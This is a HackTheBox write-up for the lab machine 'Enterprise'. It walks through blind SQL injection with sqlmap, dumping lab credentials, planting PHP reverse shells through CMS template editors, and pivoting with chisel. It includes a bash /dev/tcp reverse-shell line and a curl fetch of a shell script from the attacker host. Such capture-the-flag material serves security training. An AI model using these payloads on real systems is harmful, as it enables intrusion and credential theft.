---
title: "Enterprise"
date: 2021-07-26 20:58:00 +0530
categories: [HackTheBox, Binary Exploitation]
tags: [linux, wordpress, joomla , sql-injection, pivoting, mount, buffer-overflow, pie-enabled, return-to-libc, hackthebox]
image: /assets/img/Posts/Enterprise/Enterprise.png
---
# Masscan + Nmap
```bash
$ masscan -p1-65535,U:1-65535 `IP` --rate=10000 -e tun0 | tee masscan.out
Discovered open port 32812/tcp on 10.10.10.61                                  
Discovered open port 80/tcp on 10.10.10.61                                     
Discovered open port 22/tcp on 10.10.10.61                                     
Discovered open port 8080/tcp on 10.10.10.61  
Discovered open port 443/tcp on 10.10.10.61
```
Parse those ports to nmap:
```bash
ports=$(cat masscan.out |awk '{ print $4 }' | sed 's/\/tcp//;s/\/udp//' | tr '\n' ',' | sed 's/,$//')
nmap -sVC --min-rate 1000 -p $ports `IP` -oN nmap-fullscan.out

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.8.1
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: USS Enterprise &#8211; Ships Log
443/tcp open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
|_http-server-header: Apache/2.4.25 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
| Not valid before: 2017-08-25T10:35:14
|_Not valid after:  2017-09-24T10:35:14
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
8080/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-generator: Joomla! - Open Source Content Management
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-title: Home
32812/tcp open  unknown
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions:
|     _______ _______ ______ _______
|     |_____| |_____/ |______
|     |_____ |_____ | | | _ ______|
|     Welcome to the Library Computer Access and Retrieval System
|     Enter Bridge Access Code:
|     Invalid Code
|     Terminating Console
|   NULL:
|     _______ _______ ______ _______
|     |_____| |_____/ |______
|     |_____ |_____ | | | _ ______|
|     Welcome to the Library Computer Access and Retrieval System
|_    Enter Bridge Access Code:
```
Added `enterpise.htb`, `enterprise.local` to /etc/hosts.

I can give `wpscan` a try as I see wordpress installed on port 80. It find a username `william-riker`.
```bash
$ wpscan --url http://enterprise.htb -e

[+] URL: http://enterprise.htb/ [10.10.10.61]
[+] Started: Sun Jul 25 21:38:58 2021

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:07 <===============================================================================================================> (356 / 356) 100.00% Time: 00:00:07

[i] User(s) Identified:

[+] william.riker
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] william-riker
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```
## Web 80
Directory fuzzing:
```bash
$ ffuf -u http://enterprise.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .txt,.php,.html -fc 401,403,405                   

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://enterprise.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Extensions       : .txt .php .html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 401,403,405
________________________________________________

wp-admin                [Status: 301, Size: 319, Words: 20, Lines: 10]
wp-includes             [Status: 301, Size: 322, Words: 20, Lines: 10]
wp-content              [Status: 301, Size: 321, Words: 20, Lines: 10]
wp-login.php            [Status: 200, Size: 2428, Words: 150, Lines: 70]
readme.html             [Status: 200, Size: 7413, Words: 760, Lines: 99]
wp-trackback.php        [Status: 200, Size: 135, Words: 11, Lines: 5]
license.txt             [Status: 200, Size: 19935, Words: 3334, Lines: 386]
wp-settings.php         [Status: 200, Size: 370, Words: 34, Lines: 5]
wp-links-opml.php       [Status: 200, Size: 224, Words: 13, Lines: 11]
:: Progress: [252348/252348] :: Job [1/1] :: 193 req/sec :: Duration: [0:22:54] :: Errors: 0 ::
```
## Web 8080
Directory fuzzing:
```bash
$ ffuf -u http://enterprise.htb:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .txt,.php,.html -fc 401,403,405

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://enterprise.htb:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Extensions       : .txt .php .html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 401,403,405
________________________________________________

cache                   [Status: 301, Size: 323, Words: 20, Lines: 10]
templates               [Status: 301, Size: 327, Words: 20, Lines: 10]
plugins                 [Status: 301, Size: 325, Words: 20, Lines: 10]
media                   [Status: 301, Size: 323, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 7704, Words: 345, Lines: 210]
language                [Status: 301, Size: 326, Words: 20, Lines: 10]
tmp                     [Status: 301, Size: 321, Words: 20, Lines: 10]
administrator           [Status: 301, Size: 331, Words: 20, Lines: 10]
components              [Status: 301, Size: 328, Words: 20, Lines: 10]
bin                     [Status: 301, Size: 321, Words: 20, Lines: 10]
libraries               [Status: 301, Size: 327, Words: 20, Lines: 10]
images                  [Status: 301, Size: 324, Words: 20, Lines: 10]
modules                 [Status: 301, Size: 325, Words: 20, Lines: 10]
includes                [Status: 301, Size: 326, Words: 20, Lines: 10]
LICENSE.txt             [Status: 200, Size: 18092, Words: 3133, Lines: 340]
files                   [Status: 301, Size: 323, Words: 20, Lines: 10]
home                    [Status: 200, Size: 7695, Words: 345, Lines: 210]
about                   [Status: 200, Size: 8170, Words: 402, Lines: 211]
```

I do see a /administrator endpoint, which has a joomla login page. Tried default and common creds, they didn't work.
## Web 443
Directory bruteforcing
```bash
$ ffuf -u https://enterprise.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .txt,.php,.html -fc 401,403,405

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://enterprise.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Extensions       : .txt .php .html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 401,403,405
________________________________________________

index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376]
files                   [Status: 301, Size: 318, Words: 20, Lines: 10]
.                       [Status: 200, Size: 10918, Words: 3499, Lines: 376]
```

Visiting /files gives `lcars.zip`.
```bash
$ unzip lcars.zip
Archive:  lcars.zip
  inflating: lcars/lcars_db.php
  inflating: lcars/lcars_dbpost.php
  inflating: lcars/lcars.php
```

**lcars.php**:
This file doesn't have any code but some comments, which mentions user-interface isn't created for these php files/pages.
```php
<?php
/*
*     Plugin Name: lcars
*     Plugin URI: enterprise.htb
*     Description: Library Computer Access And Retrieval System
*     Author: Geordi La Forge
*     Version: 0.2
*     Author URI: enterprise.htb
*                             */
// Need to create the user interface.
// need to finsih the db interface
// need to make it secure
?>
```

**lcars_dbpost.php**:
- Setups basic mysqli connection.
- Checks for a parameter query being passed.
- If that's passed then first it's changed to only integer. (Which spoils any chance of SQL injection)
- Title for the post matching the ID passed in query variable is selected and printed.
```bash
<?php
include "/var/www/html/wp-config.php";
$db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
// Test the connection:
if (mysqli_connect_errno()){
    // Connection Error
    exit("Couldn't connect to the database: ".mysqli_connect_error());
}
// test to retireve a post name
if (isset($_GET['query'])){
    $query = (int)$_GET['query'];
    $sql = "SELECT post_title FROM wp_posts WHERE ID = $query";
    $result = $db->query($sql);
    if ($result){
        $row = $result->fetch_row();
        if (isset($row[0])){
            echo $row[0];
        }
    }
} else {
    echo "Failed to read query";
}
?>
```

**lcars_db.php**:
- Setups basic mysqli connection.
- Checks for a parameter query being passed.
- ID for the post matching the post name passed in query variable is selected and printed.
```php
<?php
include "/var/www/html/wp-config.php";
$db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
// Test the connection:
if (mysqli_connect_errno()){
    // Connection Error
    exit("Couldn't connect to the database: ".mysqli_connect_error());
}
// test to retireve an ID
if (isset($_GET['query'])){
    $query = $_GET['query'];
    $sql = "SELECT ID FROM wp_posts WHERE post_name = $query";
    $result = $db->query($sql);
    echo $result;
} else {
    echo "Failed to read query";
}
?>
```
# Foothold
## Locating php files
Trying to find where all these php files exist, I make a directory list which has all directories in port 80,8080 and php file names from zip, and fire it up on port 80, 443 and 8080.
```
wp-admin
wp-includes
wp-content
cache
templates
plugins
media
language
tmp
administrator
components
bin
libraries
images
modules
includes
files
home
about
lcars
lcars_db.php
lcars_dbpost.php
lcars.php
```

Recursive directory brute-forcing port 80 with `feroxbuster`:
```bash
$ feroxbuster -u http://enterprise.htb/ -w ./list

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher                    ver: 2.2.1
───────────────────────────┬──────────────────────
     Target Url            │ http://enterprise.htb/
     Threads               │ 50
     Wordlist              │ ./list
     Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
     Timeout (secs)        │ 7
     User-Agent            │ feroxbuster/2.2.1
     Config File           │ /etc/feroxbuster/ferox-config.toml
     Recursion Depth       │ 4
     New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      319c http://enterprise.htb/wp-admin
301        9l       28w      321c http://enterprise.htb/wp-content
301        9l       28w      322c http://enterprise.htb/wp-includes
301        9l       28w      329c http://enterprise.htb/wp-includes/images
301        9l       28w      329c http://enterprise.htb/wp-content/plugins
301        9l       28w      326c http://enterprise.htb/wp-admin/images
301        9l       28w      328c http://enterprise.htb/wp-admin/includes
301        9l       28w      335c http://enterprise.htb/wp-content/plugins/lcars
200        4l        0w        9c http://enterprise.htb/wp-content/plugins/lcars/lcars.php
200        4l        4w       25c http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php
200        1l        4w       22c http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php
301        9l       28w      335c http://enterprise.htb/wp-includes/images/media
```
And we do find the `lcars` php pages in `wp-content/plugins` which makes sense since we got a zip and wordpress plugins are usually zip files.

## lcars_dbpost.php
Let's try to access `lcars_dbpost.php`:
```bash
$ curl http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=1
Hello world!
$ curl http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=4
Espresso
```

Let's make a loop:
```bash
$ for i in {1..100}; do echo -n "Post $i: "; curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=$i | tr -s '\n'; done  | tee post-name-list
Post 1: Hello world! 
Post 3: Auto Draft 
Post 4: Espresso 
Post 5: Sandwich 
Post 6: Coffee 
Post 7: Home 
Post 8: About 
Post 9: Contact 
Post 10: Blog 
Post 11: A homepage section 
Post 13: enterprise_header 
Post 14: Espresso 
Post 15: Sandwich 
Post 16: Coffee 
Post 23: enterprise_header 
Post 24: cropped-enterprise_header-1.jpg 
Post 30: Home 
Post 34: Yelp 
Post 35: Facebook 
Post 36: Twitter 
Post 37: Instagram 
Post 38: Email  
Post 40: Hello world! 
Post 51: Stardate 49827.5 
Post 52: Stardate 49827.5 
Post 53: Stardate 50893.5 
Post 54: Stardate 50893.5 
Post 55: Stardate 52179.4 
Post 56: Stardate 52179.4 
Post 57: Stardate 55132.2 
Post 58: Stardate 55132.2 
Post 66: Passwords 
Post 67: Passwords 
Post 68: Passwords 
Post 69: YAYAYAYAY. 
Post 70: YAYAYAYAY. 
Post 71: test 
Post 78: YAYAYAYAY. 
```
I do see items 66-68 named Passwords.
Visiting home-page shows a posts section redirecting to `http://enterprise.htb/?p=69`, which YAYAYAYAY. I tried to change that value to 66,67,68 nothing worked.

## lcars_db.php
Visiting `lcars_db.php`:
```bash
$ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 

Catchable fatal error: Object of class mysqli_result could not be converted to
string in /var/www/html/wp-content/plugins/lcars/lcars_db.php on line 16
```
That happens because even though lcars_db.php doesn't have a (int) type change before passing the variable to sql query. 
It doesn't have the below code which fetches the query row and outputs it properly in form of string.  
```php
 if ($result){
        $row = $result->fetch_row();
        if (isset($row[0])){
            echo $row[0];
        }
    }
```
So this one becomes sort of Blind-SQL injection.

## Dumping databases
Using `sqlmap` to get databases:
```bash
$ sqlmap -u http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -dbms mysql --dbs
sqlmap -u http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -dbms mysql --dbs
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.5.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:53:44 /2021-07-26/

[02:53:44] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: query (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: query=(SELECT (CASE WHEN (4477=4477) THEN 1 ELSE (SELECT 2905 UNION SELECT 3751) END))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: query=1 AND (SELECT 7398 FROM (SELECT(SLEEP(5)))LHvQ)
---
available databases [8]:
[*] information_schema
[*] joomla
[*] joomladb
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress
[*] wordpressdb
```

### Dumping wordpress
Dumping wp_users table from wordpress database:
```bash
$ sqlmap -u http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -dbms mysql --dump --threads 10 -D wordpress  -T wp_users   
Database: wordpress
Table: wp_users
[1 entry]
+----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+
| ID | user_url | user_pass                          | user_email                   | user_login    | user_status | display_name  | user_nicename | user_registered     | user_activation_key |
+----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+
| 1  | <blank>  | $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2. | william.riker@enterprise.htb | william.riker | 0           | william.riker | william-riker | 2017-09-03 19:20:56 | <blank>             |
+----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+

```

Dumping wp_posts table from wordpress database where ID 66-68 contains passwords:
```bash
$ sqlmap -u http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch --dump --threads 10 -dbms mysql -D wordpress  -T wp_posts -C post_content --where "ID>=66 and ID<=68"

Database: wordpress
Table: wp_posts
[3 entries]
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| post_content                                                                                                                                                                 |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n&nbsp;\r\n\r\n&nbsp;                         |
| Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n&nbsp;\r\n\r\n&nbsp; |
| Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n&nbsp;\r\n\r\n&nbsp; |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
```

Got 4 passwords here:
```
enterprisencc170
u*Z14ru0p#ttj83zS6
ZD3YxfnSjezg67JZ
ZxJyhGem4k338S2Y
```

I'll try that in wp-login with username `william.riker`.
```bash
$ wpscan --url http://enterprise.htb/ -U william.riker -P ./wp-post-passwords --password-attack wp-login

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - william.riker / u*Z14ru0p#ttj83zS6
Trying william.riker / ZD3YxfnSjezg67JZ Time: 00:00:00 <===============================================================                                                               > (4 / 8) 50.00%  ETA: ??:??:??
[!] Valid Combinations Found:
    Username: william.riker, Password: u*Z14ru0p#ttj83zS6
```
And we can login as user william.riker.

### Dumping joomladb
Listing tables using this command shows `edz2g_users` table.
```bash
$ sqlmap -u http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch --dump --threads 10 -dbms mysql -D joomladb --tables
```

Dumping `edz2g_users` table:
```bash
$ sqlmap -u http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch --dump --threads 10 -dbms mysql -D joomladb -T edz2g_users -C username,password

Database: joomladb
Table: edz2g_users
[2 entries]
+-----------------+--------------------------------------------------------------+
| username        | password                                                     |
+-----------------+--------------------------------------------------------------+
| Guinan          | $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q |
| geordi.la.forge | $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy |
+-----------------+--------------------------------------------------------------+
```

I'm not able to crack those hashes.
I'll try spraying the users and passwords I collected until now to `http://enterprise.htb:8080/administrator/` which is joomla's login page I got earlier.

`geordi.la.forge ZD3YxfnSjezg67JZ` gives redirection when fired up in burp intruder. 
Rest give _"Username and password do not match or you do not have an account yet."_

Now, I can login to joomla admin panel.

# Shell for wordpress container
Go to Appearance -> Editor -> 404.php, edit and replace with your php reverse-shell.
Go to Home, click on a post. Change it's id to something non-existing.
Ex. [enterprise.htb/?p=999](http://enterprise.htb/?p=33)

```bash
$ rlwrap nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.61 58282
Linux b8319d86d21e 4.10.0-37-generic #41-Ubuntu SMP Fri Oct 6 20:20:37 UTC 2017 x86_64 GNU/Linux
 08:08:02 up 1 day, 15:29,  0 users,  load average: 0.00, 0.25, 0.67
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@b8319d86d21e:/$ whoami
www-data
```

This seems like a docker instance. ``/.dockerenv`` confirms that.

Getting `wp-config.php` contents:
```php
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'NCC-1701E');

/** MySQL hostname */
define('DB_HOST', 'mysql');
```

But MySQL server isn't running on this box. IP for this docker box is `172.17.0.3`. SQL server is running on `172.17.0.2`
```bash
ss -ant
State      Recv-Q Send-Q        Local Address:Port          Peer Address:Port
LISTEN     0      128                       *:80                       *:*
TIME-WAIT  0      0                172.17.0.3:80             10.10.14.17:38060
ESTAB      0      0                172.17.0.3:48116           172.17.0.2:3306
ESTAB      0      0                172.17.0.3:80             10.10.14.17:37814
TIME-WAIT  0      0                172.17.0.3:48262           172.17.0.2:3306
```

`mysql` client isn't installed on this box. Let's pivot this box.

# Pivoting
Transfer `chisel` binary to the target.
1. Set up port forwarding 
	``chisel server -p 1111 --reverse``	 on local/kali box, as usual.
	``chisel client YOUR-LOCAL-BOX-IP:1111 R:2222:127.0.0.1:3333`` on target box. Now anything I send to `localhost:2222` on kali will forward to `localhost:3333` on target.
2. There isn't any service running at `3333` which we can access with `2222`, we will make our own service which is chisel socks proxy server on victim.
 	 ``chisel server -p 3333 --socks5``
3. Connect to the proxy server of course by using that `2222` port
	to the target. That chisel socks server listening on `3333` is a way to get traffic to that port.
	``chisel client localhost:2222 socks``
4. Use proxychains to access the proxy server 
    ``echo 'socks5 127.0.0.1 1080' >> /etc/proxychains``  
	Chisel server at `1080` which is getting all that `2222` socks proxy client traffic which can be accessed by just: 
	``proxychains command``

Let's test if we've pivoted to the internal network or not by doing simple nmap scan with proxychains.
```bash
$ proxychains nmap -sT 172.17.0.1-4 --min-rate 1000 -F -sCV 2>/dev/null
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-26 14:03 IST

Nmap scan report for 172.17.0.1
Host is up (0.32s latency).
Not shown: 96 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519)
80/tcp   open  http     Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.8.1
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: USS Enterprise &#8211; Ships Log
443/tcp  open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
|_http-server-header: Apache/2.4.25 (Ubuntu)
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
| Not valid before: 2017-08-25T10:35:14
|_Not valid after:  2017-09-24T10:35:14
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
8080/tcp open  http     Apache httpd 2.4.10 ((Debian))
|_http-generator: Joomla! - Open Source Content Management
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 172.17.0.2
Host is up (0.29s latency).
Not shown: 99 closed ports
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.7.19
| mysql-info:
|   Protocol: 10
|   Version: 5.7.19
|   Thread ID: 344981
|   Capabilities flags: 65535
|   Some Capabilities: SupportsCompression, SupportsLoadDataLocal, LongPassword, Support41Auth, ConnectWithDatabase, FoundRows, ODBCClient, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, LongColumnFlag, SwitchToSSLAfterHandshake, IgnoreSigpipes, DontAllowDatabaseTableColumn, InteractiveClient, SupportsTransactions, Speaks41ProtocolOld, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x01%\x0CR(RC\x05(y\x16(\x163]\x04L\x11\x11z
|_  Auth Plugin Name: mysql_native_password
|_ssl-date: TLS randomness does not represent time

Nmap scan report for 172.17.0.3
Host is up (0.33s latency).
Not shown: 99 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.8.1
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: USS Enterprise &#8211; Ships Log

Nmap scan report for 172.17.0.4
Host is up (0.36s latency).
Not shown: 99 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Home

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (4 hosts up) scanned in 234.87 seconds
```

Which means:
`172.17.0.1` is the Host OS binded with the services other instances are running. It hosts `ssh` and `https` service by itself. (They mention Ubuntu as host, others as Debian dockers)
`172.17.0.2` is running MySQL service.
`172.17.0.3` is running Wordpress service at 80, same binded to host.
`172.17.0.4` is running Joomla service at 8080 host, but really 80 at docker instance.

I'm still not able to access MySQL server.
```bash
$ proxychains mysql -H 172.17.0.2 -uroot -p
ProxyChains-3.1 (http://proxychains.sf.net)
Enter password:
ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/run/mysqld/mysqld.sock' (2)
```

# Shell for joomla container
After logging in. If we go to Extensions -> Templates -> Templates
We see 2 templates installed:

![enterprise-1](/assets/img/Posts/Enterprise/enterprise-1.png)

Let's edit any template and upload rev-shell.
I chose "Beez3 Details and Files", uploaded my php-reverse-shell as index.php.
Clicked on save and preview. But got no shell.

The above image shows that preview is disabled in options. I enabled preview in settings options above.
Still don't see any shell back to me.
Let's try doing some simple command injections: 
```php
<?php
echo system("whoami");
?> 
```
and that when previewed shows: `www-data www-data`

Which means it's vulnerable to cmd-injection. `bash -i >& /dev/tcp/10.10.14.17/4444 0>&1` didn't work, there's still one workaround:
```php
<?php
system("bash -c 'bash -i >& /dev/tcp/10.10.14.17/4444 0>&1'");
?> 
```
gives us the shell.
```bash
$ rlwrap nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.61 37344
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@a7018bfdc454:/var/www/html$
```
Checking IP address: `172.17.0.4`

# www-data shell for host
Running linpeas gives some interesting findings:
```bash
[+] Interesting Files Mounted
/var/www/html/files /var/www/html/files rw,relatime - ext4 /dev/mapper/enterprise--vg-root rw,errors=remount-ro,data=ordered

[+] Possible Entrypoints
root root 3.1K Aug 31  2017 /entrypoint.sh
```
Entrypoint script setups the servers running on the box, connections to mysql database and so on.
`/var/www/html/files` is mounted from a host. Let's make a test file and check on https server if that reflects.

```bash
www-data@a7018bfdc454:/var/www/html/files$ echo "Can you see me?" > caretaker
```
```bash
root@TheCaretaker:~/HTB/Enterprise$ curl https://enterprise.htb/files/caretaker -k
Can you see me?
```

Let's try uploading a php reverse shell once again.
```bash
www-data@a7018bfdc454:/var/www/html/files$ curl 10.10.14.17/phprev.php -O phprev.php
```

Visiting `https://enterprise.htb/files/phprev.php` gives a shell:
```bash
$ rlwrap nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.61 49542
Linux enterprise.htb 4.10.0-37-generic #41-Ubuntu SMP Fri Oct 6 20:20:37 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 10:57:00 up 1 day, 17:18,  0 users,  load average: 0.00, 0.00, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1472): Inappropriate ioctl for device
bash: no job control in this shell
www-data@enterprise:/$
```

And I see only one user in home directory `jeanlucpicard`, also I can read the user flag:
```bash
www-data@enterprise:/home/jeanlucpicard$ cat user.txt
08552d48aa6d6d9c05dd67f1b4ba8747
```

# Privesc via BOF
Enumerating for SUID files gives ``/bin/lcars`` binary. Which is also serving on a higher port.
```bash
$ find / -type f -perm -4000 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
